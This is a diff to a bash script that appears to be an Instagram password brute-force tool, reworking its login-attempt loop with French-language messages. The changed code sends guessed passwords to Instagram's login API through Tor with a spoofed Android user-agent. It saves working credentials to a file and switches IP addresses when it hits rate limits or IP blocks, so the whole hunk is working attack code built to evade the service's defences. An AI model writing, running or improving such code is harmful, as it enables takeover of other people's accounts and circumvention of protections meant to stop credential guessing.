@@ -164,7 +164,47 @@ useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xia
 let token++
 printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass #token
 
-{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;
+{(trap '' SIGINT && 
+response=$(curl --socks5-hostname 127.0.0.1:9050 \
+  -d "ig_sig_key_version=4&signed_body=$hmac.$data" \
+  -s \
+  --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' \
+  -w "\n%{http_code}\n" \
+  -H "$header" \
+  "https://i.instagram.com/api/v1/accounts/login/")
+
+http_code=$(echo "$response" | tail -n1)
+response_body=$(echo "$response" | head -n -1)
+
+if [[ "$http_code" == "200" ]]; then
+  if echo "$response_body" | grep -q "logged_in_user"; then
+    printf "\e[1;92m\n[✓] Mot de passe trouvé: %s\n" $pass
+    printf "Username: %s, Password: %s\n" $user $pass >> found.instashell
+    printf "\e[1;92m[*] Sauvegardé dans:\e[0m\e[1;77m found.instashell\n\e[0m"
+    kill -1 $$
+  elif echo "$response_body" | grep -q "challenge_required"; then
+    printf "\e[1;93m\n[!] Mot de passe trouvé mais challenge requis: %s\n" $pass
+    printf "Username: %s, Password: %s (Challenge Required)\n" $user $pass >> found.instashell
+    printf "\e[1;92m[*] Sauvegardé dans:\e[0m\e[1;77m found.instashell\n\e[0m"
+    kill -1 $$
+  fi
+elif [[ "$http_code" == "429" ]]; then
+  printf "\e[1;91m[!] Rate limit atteint - Changement d'IP\n\e[0m"
+  changeip
+elif [[ "$http_code" == "403" ]]; then
+  if echo "$response_body" | grep -q "ip_block"; then
+    printf "\e[1;91m[!] IP bloquée - Changement d'IP\n\e[0m"
+    changeip
+  fi
+elif [[ "$http_code" == "400" ]]; then
+  if echo "$response_body" | grep -q "bad_password"; then
+    printf "\e[1;91m[-] Mauvais mot de passe: %s\n\e[0m" $pass
+  fi
+else
+  printf "\e[1;91m[!] Erreur inconnue (HTTP %s) - Changement d'IP\n\e[0m" $http_code
+  changeip
+fi
+) } & done; wait $!;
 
 let startline+=$threads
 let endline+=$threads
